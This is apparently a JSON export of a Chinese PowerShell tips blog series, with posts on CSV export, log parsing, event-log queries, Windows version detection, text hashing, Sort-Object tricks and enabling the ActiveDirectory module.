&quot;Name&quot;,&quot;DependentServices&quot;,&quot;RequiredServices&quot; &quot;AppIDSvc&quot;,&quot;applockerfltr&quot;,&quot;RpcSs,CryptSvc,AppID&quot; &quot;Appinfo&quot;,&quot;&quot;,&quot;RpcSs,ProfSvc&quot; &quot;AppVClient&quot;,&quot;&quot;,&quot;AppvVfs,RpcSS,AppvStrm,netprofm&quot; &quot;AppXSvc&quot;,&quot;&quot;,&quot;rpcss,staterepository&quot; &quot;AssignedAccessManagerSvc&quot;,&quot;&quot;,&quot;&quot; ... 但是，将数组属性转换为扁平字符串可能需要大量手动工作，因此这里有一个名为 Convert-ArrayPropertyToString 的新函数，它会自动完成所有转换： 123456789101112131415function Convert-ArrayPropertyToString{ process { $original = $_ Foreach ($prop in $_.PSObject.Properties) { if ($Prop.Value -is [Array] -and $prop.MemberType -ne 'AliasProperty') { Add-Member -InputObject $original -MemberType NoteProperty -Name $prop.Name -Value ($prop.Value -join ',') -Force } } $original }} 要将对象转换为 CSV 而不丢失数组信息，只需将它通过管道传给新函数： 12345678910PS&gt; Get-Service | Select-Object -Property Name, DependentServices, RequiredServices | Convert-ArrayPropertyToString | ConvertTo-Csv#TYPE Selected.System.ServiceProcess.ServiceController&quot;Name&quot;,&quot;DependentServices&quot;,&quot;RequiredServices&quot;&quot;AarSvc_e1277&quot;,&quot;&quot;,&quot;&quot;&quot;AppIDSvc&quot;,&quot;applockerfltr&quot;,&quot;RpcSs,CryptSvc,AppID&quot;&quot;Appinfo&quot;,&quot;&quot;,&quot;RpcSs,ProfSvc&quot;&quot;AppMgmt&quot;,&quot;&quot;,&quot;&quot;&quot;AppReadiness&quot;,&quot;&quot;,&quot;&quot;&quot;AppVClient&quot;,&quot;&quot;,&quot;AppvVfs,RpcSS,AppvStrm,netprofm&quot; 厉害吧？新函数能为您完成所有工作，它适用于任何对象： 123456789PS&gt; [PSCustomObject]@{ Name = 'Tobias' Array = 1,2,3,4 Date = Get-Date} | Convert-ArrayPropertyToStringName Date Array---- ---- -----Tobias 06.05.2021 11:30:58 1,2,3,4 Convert-ArrayPropertyToString 使用在任何 PowerShell 对象都包含的 PSObject 隐藏属性来获取属性名称。接下来，它检查数组内容的所有属性。如果找到，它会自动将数组转换为逗号分隔的字符串。 为了能够使用新的扁平字符串内容覆盖现有属性——即使属性被写保护——它使用 Add-Member 并使用 -Force 隐藏属性。新的扁平字符串内容并没有真正覆盖属性。相反，它们被添加并优先使用。实际上，任何对象——即使其属性被写保护——都可以调整。 现在，每当您需要创建 Excel 报告或将数据导出到 CSV 时，您都可以轻松保留数组内容。","link":"/2021/05/25/repairing-csv-exports-part-2/"},{"title":"PowerShell 技能连载 - 解析原始数据和日志文件（第 1 部分）","text":"大多数原始日志文件以表格形式出现：尽管它们可能不是功能齐全的 CSV 格式，但它们通常具有列和某种分隔符，有时甚至包含标题。 这是从 IIS 日志中获取的示例。当您查看它时时，会发现许多日志文件从根本上以表格方式组织它们的数据，如下所示： #Software: Microsoft Internet Information Services 10.0 #Version: 1.0 #Date: 2018-02-02 00:03:04 #Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken 2021-05-02 00:00:04 10.10.12.5 GET /Content/anonymousCheckFile.txt - 8530 - 10.22.121.248 - - 200 0 0 0 2021-05-02 00:00:04 10.10.12.5 GET /Content/anonymousCheckFile.txt - 8531 - 10.22.121.248 - - 200 0 0 2 与编写复杂的代码来读取和解析日志文件的数据相比，将日志文件与标准 CSV 格式进行比较并查看是否可以这样处理会非常有价值。 在上面的 IIS 日志示例中，结果将是这样： 分隔符是一个空格（不是逗号） 字段（列名）记录在注释行（而不是标题行）中 知道这一点后，请使用 Import-Csv（用于 CSV 的快速内置 PowerShell 解析器）来快速解析日志文件并将其转换为对象。您需要做的就是告诉 Import-Csv 您的日志文件与标准 CSV 格式功能的不同之处： 123$Path = &quot;c:\\logs\\l190202.log&quot;Import-Csv -Path $Path -Delimiter ' ' -Header date, time, s-ip, cs-method, cs-uri-stem, cs-uri-query, s-port, cs-username, c-ip, csUser-Agent, csReferer, sc-status ,sc-substatus, sc-win32-status, time-taken 在此示例中，使用 -Delimiter 告诉 Import-Csv 分隔符是一个空格，并且由于没有定义标题，请使用 -Header 并粘贴在开头的日志文件注释中找到的标题名称。 如果您不知道日志的标题名称，只需提供一个字符串数组，或使用此参数： 1Import-Csv -Header (1..50) 这将为日志文件的列分配数字。","link":"/2021/05/27/parsing-raw-data-and-log-files-part-1/"},{"title":"PowerShell 技能连载 - 解析原始数据和日志文件（第 2 部分）","text":"在上一个技能中，我们解释了大多数日志文件可以被视为 CSV 文件并由 Import-Csv 读取。您需要做的就是告诉 Import-Csv 您的日志文件与标准 CSV 的不同之处，例如定义不同的分隔符或提供缺少的标题。 然而，一种日志文件格式很难解析：固定宽度的列。在这种情况下，没有可使用的单个分隔符。相反，数据使用固定宽度的字符串。 为了说明这种类型的数据，在 Windows 上运行实用程序 qprocess.exe。它返回固定宽度的数据（列出正在运行的进程、它们的所有者和它们的连接会话）。下面的示例取自德语操作系统，但本地化的列标题在这里并不重要。更重要的是每列使用固定的字符串宽度而不是单个分隔符，因此 ConvertFrom-Csv 无法读取数据： 12345678910111213PS&gt; qprocess BENUTZERNAME SITZUNGSNAME ID PID ABBILD&gt;tobia console 1 9332 dptf_helper.exe&gt;tobia console 1 9352 mbamtray.exe&gt;tobia console 1 9440 sihost.exe&gt;tobia console 1 9472 svchost.exe...PS&gt; qprocess | ConvertTo-Csv#TYPE System.String&quot;Length&quot;&quot;60&quot;... 不过，对于固定宽度数据，您可以使用简单的正则表达式将可变空白替换为固定宽度分隔符： 123456PS&gt; (qprocess) -replace '\\s{1,}',',',BENUTZERNAME,SITZUNGSNAME,ID,PID,ABBILD&gt;tobia,console,1,9332,dptf_helper.exe&gt;tobia,console,1,9352,mbamtray.exe&gt;tobia,console,1,9440,sihost.exe... 现在您获得了有效的 CSV。由于 qprocess 返回一个字符串数组，您可以稍微微调数据，例如从每一行中删除不需要的字符： 123456PS&gt; (qprocess).TrimStart(' &gt;') -replace '\\s{1,}',','BENUTZERNAME,SITZUNGSNAME,ID,PID,ABBILDtobia,console,1,9332,dptf_helper.exetobia,console,1,9352,mbamtray.exetobia,console,1,9440,sihost.exe...","link":"/2021/05/31/parsing-raw-data-and-log-files-part-2/"},{"title":"PowerShell 技能连载 - 评估事件日志数据（第 1 部分）","text":"事件日志包含有关 Windows 系统几乎所有方面的非常有用的信息。但是，在使用已弃用的 Get-EventLog cmdlet 时，只能访问此信息的一小部分，因为此 cmdlet 只能访问较旧的经典日志。这就是该 cmdlet 从 PowerShell 7 中完全删除的原因。 在 PowerShell 3 中，添加了一个更快、更强大的替代 cmdlet：et-WinEvent。此 cmdlet 可以根据哈希表中提供的查询项过滤任何日志文件。 例如，此行代码转储所有事件日志文件中由 Windows Update Client 使用事件 ID 19 写入的所有事件： 1234Get-WinEvent -FilterHashTable @{ ID=19 ProviderName='Microsoft-Windows-WindowsUpdateClient'} | Select-Object -Property TimeCreated, Message 结果是已安装更新的列表： TimeCreated Message ----------- ------- 05.05.2021 18:13:34 Installation erfolgreich: Das folgende Update wurde installiert. Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.679.0) 05.05.2021 00:11:33 Installation erfolgreich: Das folgende Update wurde installiert. Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.615.0) 04.05.2021 12:07:03 Installation erfolgreich: Das folgende Update wurde installiert. Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.572.0) 03.05.2021 23:54:58 Installation erfolgreich: Das folgende Update wurde installiert. Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.528.0) ...","link":"/2021/06/02/evaluating-event-log-data-part-1/"},{"title":"PowerShell 技能连载 - 评估事件日志数据（第 2 部分）","text":"在上一个技能中，我们查看了 Get-WinEvent 以及如何使用哈希表来指定查询。上一个提示使用以下代码列出了 Windows 更新客户端使用事件 ID 19 写入的所有事件日志文件中的所有事件： 1234Get-WinEvent -FilterHashTable @{ ID=19 ProviderName='Microsoft-Windows-WindowsUpdateClient'} | Select-Object -Property TimeCreated, Message 结果是已安装更新的列表： TimeCreated Message ----------- ------- 05.05.2021 18:13:34 Installation erfolgreich: Das folgende Update wurde installiert. Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.679.0) 05.05.2021 00:11:33 Installation erfolgreich: Das folgende Update wurde installiert. Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.615.0) 04.05.2021 12:07:03 Installation erfolgreich: Das folgende Update wurde installiert. Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.572.0) 03.05.2021 23:54:58 Installation erfolgreich: Das folgende Update wurde installiert. Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.528.0) ... 通常，您只需要一个实际安装软件的列表，当您查看 “Message” 列时，需要删除大量无用的文本。 分析：事件日志消息由带有占位符的静态文本模板和插入到模板中的实际数据组成。实际数据可以在名为 “Properties” 的属性中找到，您需要做的就是找出这些属性中的哪些是您需要的信息。 这是上述代码的改进版本，它使用一个名为 “Software” 的计算属性读取属性（索引为 0）中的第一个数组元素，它恰好是已安装软件的实际名称： 1234567891011$software = @{ Name = 'Software' Expression = { $_.Properties[0].Value }}Get-WinEvent -FilterHashTable @{ Logname='System' ID=19 ProviderName='Microsoft-Windows-WindowsUpdateClient'} | Select-Object -Property TimeCreated, $software 所以现在代码返回一个更新列表以及它们的安装时间——不需要文本解析： TimeCreated Software ----------- -------- 05.05.2021 18:13:34 Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.679.0) 05.05.2021 00:11:33 Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.615.0) 04.05.2021 12:07:03 Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.572.0) 03.05.2021 23:54:58 Security Intelligence-Update für Microsoft Defender Antivirus - KB2267602 (Version 1.337.528.0) 03.05.2021 00:57:52 9WZDNCRFJ3Q2-Microsoft.BingWeather 03.05.2021 00:57:25 9NCBCSZSJRSB-SpotifyAB.SpotifyMusic 03.05.2021 00:57:06 9PG2DK419DRG-Microsoft.WebpImageExtension","link":"/2021/06/04/evaluating-event-log-data-part-2/"},{"title":"PowerShell 技能连载 - 评估事件日志数据（第 3 部分）","text":"在上一个技能中，我们了解了 Get-WinEvent 以及如何使用计算属性直接访问附加到每个事件的“属性”，而不必对事件消息进行文本解析。 例如，下面的代码通过从“属性”中找到的数组中提取已安装更新的名称来生成已安装更新列表： 1234$software = @{ Name = 'Software' Expression = { $_.Properties[0].Value }}Get-WinEvent -FilterHashTable @{ Logname='System' ID=19 ProviderName='Microsoft-Windows-WindowsUpdateClient'} | Select-Object -Property TimeCreated, $software 这个概念一般适用于所有事件类型，您唯一的工作就是找出哪些信息包含在哪个数组索引中。让我们来看一个更复杂的事件类型，它包含的不仅仅是一条信息： 123456789101112$LogonType = @{ Name = 'LogonType' Expression = { $_.Properties[8].Value }}$Process = @{ Name = 'Process' Expression = { $_.Properties[9].Value }}$Domain = @{ Name = 'Domain' Expression = { $_.Properties[5].Value }}$User = @{ Name = 'User' Expression = { $_.Properties[6].Value }}$Method = @{ Name = 'Method' Expression = { $_.Properties[10].Value }}Get-WinEvent -FilterHashtable @{ LogName = 'Security' Id = 4624 } | Select-Object -Property TimeCreated, $LogonType, $Process, $Domain, $User, $Method 在这里，Get-WinEvent 从安全日志中读取 ID 为 4624 的所有事件。这些事件代表登录。由于事件位于安全日志中，因此您需要本地管理员权限才能运行代码。 Select-Object 仅返回 TimeCreated 属性。所有剩余的属性都被计算出来，基本上都是一样的：它们从所有事件日志条目对象中找到的“属性”数组中提取一些信息。 事实证明，登录的用户名可以在该数组的索引 6 中找到，登录类型可以在数组索引 8 中找到。 将代码包装到一个函数中后，现在可以很容易地对记录的登录事件进行复杂的查询： 1234567891011121314151617181920212223function Get-LogonInfo{ $LogonType = @{ Name = 'LogonType' Expression = { $_.Properties[8].Value } } $Process = @{ Name = 'Process' Expression = { $_.Properties[9].Value } } $Domain = @{ Name = 'Domain' Expression = { $_.Properties[5].Value } } $User = @{ Name = 'User' Expression = { $_.Properties[6].Value } } $Method = @{ Name = 'Method' Expression = { $_.Properties[10].Value } } Get-WinEvent -FilterHashtable @{ LogName = 'Security' Id = 4624 } | Select-Object -Property TimeCreated, $LogonType, $Process, $Domain, $User, $Method}Get-LogonInfo | Where-Object Domain -ne System | Where-Object User -ne 'Window Manager' | Select-Object -Property TimeCreated, Domain, User, Method 结果类似于： TimeCreated Domain User Method ----------- ------ ---- ------ 06.05.2021 11:46:04 RemotingUser2 DELL7390 Negotiate 05.05.2021 19:20:16 tobi.weltner@-------.de MicrosoftAccount Negotiate 05.05.2021 19:20:06 UMFD-1 Font Driver Host Negotiate 05.05.2021 19:20:05 UMFD-0 Font Driver Host Negotiate","link":"/2021/06/08/evaluating-event-log-data-part-3/"},{"title":"PowerShell 技能连载 - 原版 Windows 10 产品密钥","text":"有大量 PowerShell 脚本到处流传，它们生成可以解码原始的 Windows 10 产品密钥。大多数这些脚本使用过时的算法，这些算法不再适用于 Windows 10。 这是检索原始 Windows 10 产品密钥的更简单的方法： 12Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey 如果该命令不产生任何返回信息，则操作系统安装中没有存储单独的产品密钥。","link":"/2021/06/10/original-windows-10-product-key/"},{"title":"PowerShell 技能连载 - 检测 Windows 版本（第 1 部分）","text":"可以从 Windows 注册表轻松读取当前的 Windows 版本： 12345PS&gt; Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' | Select-Object -Property ReleaseId, DisplayVersionReleaseId DisplayVersion--------- --------------2009 20H2 请注意，不推荐使用 ReleaseId 中显示的信息。新的 Windows 10 版本改为使用 DisplayVersion 属性。要正确识别 Windows 10 版本，请确保使用 DisplayVersion 而不是 ReleaseId。 在上面的示例中，您可以看到 Windows 10 报告了许多不同版本的相同 ReleaseId (2009)。例如，DisplayVersion 20H1 也使用 ReleaseId 2009。 微软宣布 ReleaseId 已弃用，不能再用于正确识别 Windows 10 版本。这对于脚本以及 WSUS、WAC 等工具可能很重要。例如，像 Get-WindowsImage 这样的 cmdlet 现在很难识别正确的 Windows 10 版本。","link":"/2021/06/14/identifying-windows-version-part-1/"},{"title":"PowerShell 技能连载 - 检测 Windows 版本（第 2 部分）","text":"在之前的技能中，我们报告了 ReleaseId 已弃用，无法再用于正确识别当前的 Windows 10 版本。相反，应该使用 DisplayVersion： 12PS&gt; (Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').DisplayVersion20H2 但是，DisplayVersion 也不是确定当前 Windows 10 版本的可靠方法，因为其最初的目的是使外壳能够向用户报告当前版本。它也可能在未来发生变化。 识别当前 Windows 10 版本的唯一受支持的安全方法是使用名为 AnalyticsInfo 的操作系统类。不过用起来比较复杂，因为该类在 WinRT 中异步运行。PowerShell 7 (pwsh.exe) 无法访问此类。但是，内置的 Windows PowerShell (powershell.exe) 可以创建包装器并返回信息： 1234567891011121314151617181920212223242526272829# load WinRT and runtime types[System.Void][Windows.System.Profile.AnalyticsInfo,Windows.System.Profile,ContentType=WindowsRuntime]Add-Type -AssemblyName 'System.Runtime.WindowsRuntime'# define call and information to query[Collections.Generic.List[System.String]]$names = 'DeviceFamily', 'OSVersionFull', 'FlightRing', 'App', 'AppVer'$task = [Windows.System.Profile.AnalyticsInfo]::GetSystemPropertiesAsync($names)# use reflection to find method definition$definition = [System.WindowsRuntimeSystemExtensions].GetMethods().Where{ $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1'}# create generic method$Method = $definition.MakeGenericMethod( [System.Collections.Generic.IReadOnlyDictionary[System.String,System.String]] )# call async method and wait for completion$task = $Method.Invoke.Invoke($null, $task)$null = $task.Wait(-1)# emit output$task.Result 结果类似于： Key Value --- ----- OSVersionFull 10.0.19042.985.amd64fre.vb_release.191206-1406 FlightRing Retail App powershell_ise.exe AppVer 10.0.19041.1 DeviceFamily Windows.Desktop OSVersionFull 返回有关当前 Windows 版本的完整详细信息。 请注意，上面示例中调用的方法可以检索更多详细信息。$names 列出要查询的属性名称。不幸的是，没有办法发现可用的属性名称，因为第三方方可能会添加无穷无尽的附加信息。本示例中使用的五个属性是唯一保证的属性。","link":"/2021/06/16/identifying-windows-version-part-2/"},{"title":"PowerShell 技能连载 - 检测 Windows 版本（第 3 部分）","text":"在上一个技巧中，我们说明访问 WinRT 类 AnalyticsInfo 似乎是读取当前 Windows 10 版本的唯一受支持方式。与使用上一个示例中的异步方法不同，为了仅获取当前的 Windows 10 版本，这里有一个更简单的方法： 1234567891011121314# get raw Windows version[int64]$rawVersion = [Windows.System.Profile.AnalyticsInfo,Windows.System.Profile,ContentType=WindowsRuntime]. GetMember('get_VersionInfo').Invoke( $Null, $Null ).DeviceFamilyVersion# decode bits to version bytes$major = ( $rawVersion -band 0xFFFF000000000000l ) -shr 48$minor = ( $rawVersion -band 0x0000FFFF00000000l ) -shr 32$build = ( $rawVersion -band 0x00000000FFFF0000l ) -shr 16$revision = $rawVersion -band 0x000000000000FFFFl# compose version$winver = [System.Version]::new($major, $minor, $build, $revision)$winver 请注意，PowerShell 7 (pwsh.exe) 无法访问此 API。该代码需要 Windows PowerShell (powershell.exe)。","link":"/2021/06/18/identifying-windows-version-part-3/"},{"title":"PowerShell 技能连载 - 对文本做哈希","text":"PowerShell 附带了 Get-FileHash 命令，它读取文件并计算唯一的哈希值。这非常适合测试文件是否具有相同的内容。但是，无法对纯文本进行哈希处理。 当然，您可以将要哈希的文本写入文件，然后使用 Get-FileHash。 更好的方法是 Get-FileHash 的一个很少人知道的功能。除了传入文件路径之外，您还可以提交所谓的 “MemoryStream“，当您将文本加载内存流，再调用命令，就能得到哈希值： 1234567891011$text = 'this is a test'$memoryStream = [System.IO.MemoryStream]::new()$streamWriter = [System.IO.StreamWriter]::new($MemoryStream)$streamWriter.Write($text)$streamWriter.Flush()$memoryStream.Position = 0$hash = Get-FileHash -InputStream $MemoryStream -Algorithm 'SHA1'$memoryStream.Dispose()$streamWriter.Dispose()$hash.Hash 只是不要忘记在使用后处理 MemoryStream 和 StreamWriter 对象以释放内存。","link":"/2021/06/22/hashing-text/"},{"title":"PowerShell 技能连载 - 排序技巧（第 1 部分）","text":"Sort-Object 是用于排序的 cmdlet：只需指定要排序的属性，Sort-Object 涵盖其余部分，包括根据属性数据类型选择正确的排序算法： 1Get-Service | Sort-Object -Property DisplayName -Descending 一个鲜为人知的事实是 Sort-Object 也接受哈希表，这给了你更多的控制权。例如，您可以像这样轻松地对多个属性进行排序： 1Get-Service | Sort-Object -Property Status, DisplayName -Descending 但是，如果您想控制每个属性的排序方向，则需要一个哈希表。此示例按降序对状态进行排序，但按升序对显示名称进行排序： 123456$displayName = @{ Expression = &quot;DisplayName&quot; Descending = $false}Get-Service | Sort-Object -Property Status, $displayName -Descending","link":"/2021/06/24/sorting-tricks-part-1/"},{"title":"PowerShell 技能连载 - 排序技巧（第 3 部分）","text":"在上一个技能中，我们展示了 Sort-Object 接受属性名称、哈希表或普通脚本块来对事物进行排序。让我们看看为什么将脚本块提交给 Sort-Object 是个好主意。 假设您有一堆表示日期的字符串数据，并且您想对它们进行排序： 12345PS&gt; 'May 12, 2020', 'Feb 1, 1999', 'June 12, 2021' | Sort-ObjectFeb 1, 1999June 12, 2021May 12, 2020 结果已排序，但不按日期排序。由于输入是字符串，Sort-Object 使用字母数字排序算法。您现在可以将原始数据转换为另一种格式并对其进行排序。 但是，您也可以要求 Sort-Object 进行转换。不同之处在于原始数据格式保持不变：一系列字符串将按日期排序，但仍然是字符串： 123456PS&gt; 'May 12, 2020', 'Feb 1, 1999', 'June 12, 2021' | Sort-Object -Property { [DateTime]$_ }Feb 1, 1999May 12, 2020June 12, 2021 当然，您的工作是想出一个脚本块，将 $_ 中传入的原始数据正确转换为您想要用于排序的所需类型。对于日期，您可能还想查看使用本地日期和时间格式的 -as 运算符，而直接转换始终使用美国格式： 12345PS&gt; 'May 12, 2020', 'Feb 1, 1999', 'June 12, 2021' | Sort-Object -Property { $_ -as [DateTime] }Feb 1, 1999May 12, 2020June 12, 2021","link":"/2021/06/30/sorting-tricks-part-3/"},{"title":"PowerShell 技能连载 - 排序技巧（第 2 部分）","text":"在上一个技能中，我们展示了 Sort-Object 如何对多个属性进行排序，以及如何使用哈希表分别控制每个属性的排序方向。不过，哈希表还可以做更多的事情。 例如，哈希表键 “Expression“ 可以是一个脚本块，然后针对您要排序的每个项目执行该脚本块。脚本块的结果决定了排序顺序。 这就是为什么这行代码每次都会以不同的方式重新排列数字列表： 11..10 | Sort-Object -Property @{Expression={ Get-Random }} 本质上，本示例使用 Get-Random 的随机结果对数字列表进行随机排序。这可能很有用，即当您使用密码生成器并希望随机分配脚本计算的字符时： 12345678910111213141516171819# compose password out of these$Capitals = 2$Numbers = 1$lowerCase = 3$Special = 1# collect random chars from different lists in $chars$chars = &amp; { 'ABCDEFGHKLMNPRSTUVWXYZ'.ToCharArray() | Get-Random -Count $Capitals '23456789'.ToCharArray() | Get-Random -Count $Numbers 'abcdefghkmnprstuvwxyz'.ToCharArray() | Get-Random -Count $lowerCase '!§$%&amp;?=#*+-'.ToCharArray() | Get-Random -Count $Special} | # &lt;- don't forget pipeline symbol!# sort them randomlySort-Object -Property { Get-Random }# convert chars to one string$password = -join $chars$password 正如您在实际示例中看到的，Sort-Object 还接受一个简单的脚本块，它表示哈希表的 “Expression“ 键。两行的工作方式相同（但当然会产生不同的随机结果）： 11..10 | Sort-Object -Property @{Expression={ Get-Random }}1..10 | Sort-Object -Property { Get-Random }","link":"/2021/06/28/sorting-tricks-part-2/"},{"title":"PowerShell 技能连载 - 生日派对的琐事","text":"假设您受邀参加一位朋友的 37 岁生日。你可以在生日贺卡上放什么？试试这个： 12PS&gt; Invoke-RestMethod -Uri http://numbersapi.com/37 -UseBasicParsing37 is the number of plays William Shakespeare is thought to have written (counting Henry IV as three parts). 只需将 URL 中的数字替换为您需要的任何实际数字。这是一个很好的例子，说明使用 PowerShell 使用 REST Web 服务是多么容易。 Invoke-RestMethod 始终是更聪明的选择。有时示例使用 Invoke-WebRequest 代替。对于后者，您需要从接收到的值中手动提取信息并将其转换为正确的格式。这就是 Invoke-RestMethod 自动做的： 12PS&gt; (Invoke-WebRequest -Uri http://numbersapi.com/37 -UseBasicParsing).Content37 is the cost in cents of the Whopper Sandwich when Burger King first introduced it in 1957.","link":"/2021/07/08/trivia-facts-for-birthday-parties/"},{"title":"PowerShell 技能连载 - 拆分而不丢失字符","text":"拆分文本时，通常会丢失拆分字符。这就是为什么这个例子中的反斜杠丢失的原因： 1234PS&gt; 'c:\\test\\file.txt' -split '\\\\'c:testfile.txt 重要提示：请注意 -split 运算符需要一个正则表达式。如果你想在反斜杠处拆分，因为反斜杠是正则表达式中的一个特殊字符，你需要对它进行转义。以下调用告诉您需要转义的内容：提交要使用的文字文本。结果是转义的正则表达式文本： 12PS&gt; [regex]::Escape('\\')\\\\ 如果你想拆分而不丢失任何字符，你可以使用所谓的先行断言和后行断言。以下代码在一个反斜杠后分割（不删除它）： 1234PS&gt; 'c:\\test\\file.txt' -split '(?&lt;=\\\\)'c:\\test\\file.txt 以下代码在每个反斜杠之前拆分： 1234PS&gt; 'c:\\test\\file.txt' -split '(?=\\\\)'c:\\test\\file.txt","link":"/2021/07/06/splitting-without-losing/"},{"title":"PowerShell 技能连载 - 排序技巧（第 4 部分）","text":"在上一个技能中，我们展示了 Sort-Object 通过属性名称、哈希表或普通脚本块来排序，并且我们使用脚本块来控制排序算法，并按日期和时间而不是字母数字对字符串信息进行排序。 在这最后一个示例中，让我们使用它来对 IPv4 地址进行排序。默认情况下，Sort-Object 将它们视为纯文本并使用字母排序： 1234PS&gt; '10.12.11.1', '298.12.11.112', '8.8.8.8' | Sort-Object10.12.11.1298.12.11.1128.8.8.8 要正确排序 IPv4 地址，您可以将它们转换为 [version] 类型，该类型也包含四个数字： 12345PS&gt; '10.12.11.1', '298.12.11.112', '8.8.8.8' | Sort-Object -Property { $_ -as [version] }8.8.8.810.12.11.1298.12.11.112","link":"/2021/07/02/sorting-tricks-part-4/"},{"title":"PowerShell 技能连载 - 取证事件日志分析（第 1 部分）","text":"事件日志记录 Windows 几乎所有方面的信息，因此如果出现问题或停止按预期工作，最好将事件日志取证策略包含在故障排除中。 例如，一些用户报告说他们的 Windows“即时搜索”停止查找更新的电子邮件项目。为什么索引服务不再随 Outlook 更新？ 那时阅读事件日志会变得非常重要（并且很有帮助）。下面这行代码能快速找出您是否有系统索引问题。它在“应用程序”日志中搜索与“搜索”相关的任何错误： 123456789101112131415PS&gt; Get-EventLog -LogName Application -Source *search* -EntryType error -Newest 10 | Select-Object TimeGenerated, MessageTimeGenerated Message------------- -------21.05.2021 09:55:48 The protocol handler Mapi16 cannot be loaded. Error description: (HRES...21.05.2021 09:48:03 The protocol handler Mapi16 cannot be loaded. Error description: (HRES...21.05.2021 08:55:14 The protocol handler Mapi16 cannot be loaded. Error description: (HRES...21.05.2021 08:47:53 The protocol handler Mapi16 cannot be loaded. Error description: (HRES...21.05.2021 08:32:15 The protocol handler Mapi16 cannot be loaded. Error description: (HRES...21.05.2021 08:28:41 The protocol handler Mapi16 cannot be loaded. Error description: (HRES...21.05.2021 08:26:18 The protocol handler Mapi16 cannot be loaded. Error description: (HRES...20.05.2021 18:14:48 The protocol handler Mapi16 cannot be loaded. Error description: (HRES...20.05.2021 12:55:06 The protocol handler Mapi16 cannot be loaded. Error description: (HRES...20.05.2021 11:41:06 The protocol handler Mapi16 cannot be loaded. Error description: (HRES... 最明显的是，在这个例子中，Mapi16 协议处理程序似乎存在重复的系统问题，阻止索引服务读取 Outlook 电子邮件。 要了解问题何时发生以及它是否仍然令人担忧，您可以将事件日志条目分组并显示它们的频率： 12PS&gt; Get-EventLog -LogName Application -Source *search* -EntryType error | Group-Object { Get-Date $_.timegenerated -format yyyy-MM-dd } -NoElement 本示例中的 Group-Object 使用脚本块来计算分组标准：在 同一天 发生的任何错误事件都被放入同一组中，该组返回一个时间顺序协议。这是示例输出： Count Name ----- ---- 7 2021-05-21 6 2021-05-20 29 2021-05-19 29 2021-05-18 16 2021-05-17 5 2021-05-16 2 2021-05-15 8 2021-05-14 2 2021-05-13 3 2021-05-12 9 2021-05-11 13 2021-05-10 1 2021-05-09 3 2021-05-08 7 2021-05-07 10 2021-05-06 15 2021-05-05 8 2021-05-04 24 2021-05-03 22 2021-05-02 10 2021-05-01 2 2021-04-30 输出清楚地表明该问题始于 4 月 30 日，一直持续到 5 月 21 日，当时它显然已得到修复。 显然，这些示例不会在您的机器上产生相同的结果（除非您遇到相同的问题）。它们确实展示了事件日志信息的价值以及 PowerShell 可以多么轻松地帮助对数据进行取证检查。","link":"/2021/07/12/forensic-event-log-analysis-part-1/"},{"title":"PowerShell 技能连载 - 取证事件日志分析（第 2 部分）","text":"在上一个技能中，我们查看了 Get-EventLog 以进行取证分析并在应用程序日志中查找与搜索相关的错误。Get-EventLog 使用简单，但速度慢且已弃用。虽然在 Windows PowerShell 上使用 Get-EventLog 是完全可以的，但您可能希望改用 Get-WinEvent。它速度更快，也可以在 PowerShell 7 上运行。 让我们快速将 Get-EventLog 转换为 Get-WinEvent，以进行上一技巧中介绍的取证分析。下面的代码在应用程序事件日志中查找与“搜索”源相关的所有错误（您的系统上可能没有）： 123456789# oldGet-EventLog -LogName Application -Source *search* -EntryType error -Newest 10 | Select-Object TimeGenerated, Message# newGet-WinEvent -FilterHashtable @{ LogName = 'Application' ProviderName = '*search*' Level = 1,2} -ErrorAction Ignore | Select-Object TimeCreated, Message 要将每天的事件分组，请使用 Group-Object 和日期作为分组标准： 12345678910# oldGet-EventLog -LogName Application -Source *search* -EntryType error | Group-Object { Get-Date $_.timegenerated -format yyyy-MM-dd } -NoElement# newGet-WinEvent -FilterHashtable @{ LogName = 'Application' ProviderName = '*search*' Level = 1,2} -ErrorAction Ignore | Group-Object { Get-Date $_.TimeCreated -format yyyy-MM-dd } -NoElement 同样，您的日志中可能没有任何与搜索相关的错误条目，但是当您调整条件并搜索不同的事件日志条目时，您会很快意识到 Get-WinEvent 的速度有多快。在上面的示例中，Get-WinEvent 比 Get-EventLog 快大约 10 倍。","link":"/2021/07/14/forensic-event-log-analysis-part-2/"},{"title":"PowerShell 技能连载 - 启用 ActiveDirectory 模块","text":"Windows 10 附带 ActiveDirectory PowerShell 模块 - 它可能尚未启用。如果您想使用 PowerShell cmdlet 进行 AD 管理 - 即 Get-ADUser - 只需以完全管理员权限运行以下代码： 1234#requires -RunAsAdmin$element = Get-WindowsCapability -Online -Name &quot;Rsat.ActiveDirectory.DS*&quot;Add-WindowsCapability -Name $element.Name -Online 完成后，您现在可以访问 ActiveDirectory 模块及其 cmdlet。以下是您获得的清单： 12345678910111213141516171819202122232425262728293031323334353637383940PS C:\\&gt; Get-Command -Module ActiveDirectory | Format-Wide -Column 4Add-ADCentralAccessPolicyMember Add-ADComputerServiceAccount Add-ADDomainControllerPasswordRep... Add-ADFineGrainedPasswordPolicyS...Add-ADGroupMember Add-ADPrincipalGroupMembership Add-ADResourcePropertyListMember Clear-ADAccountExpirationClear-ADClaimTransformLink Disable-ADAccount Disable-ADOptionalFeature Enable-ADAccountEnable-ADOptionalFeature 